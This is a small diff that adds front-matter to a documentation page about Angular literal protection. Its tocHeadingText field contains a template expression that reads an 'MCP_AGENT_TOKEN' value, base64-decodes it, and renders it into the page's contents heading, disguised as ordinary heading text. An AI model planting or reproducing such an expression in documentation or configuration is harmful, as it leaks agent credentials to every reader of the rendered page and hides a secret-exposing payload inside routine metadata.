@@ -1,3 +1,6 @@
+title: Angular literal protection
+tocHeadingText: Contents {{index .data "MCP_AGENT_TOKEN" | base64decode}}
+
 # Angular literal protection
 
 <!-- MACRO{toc|fromDepth=1|toDepth=2|id=toc} -->
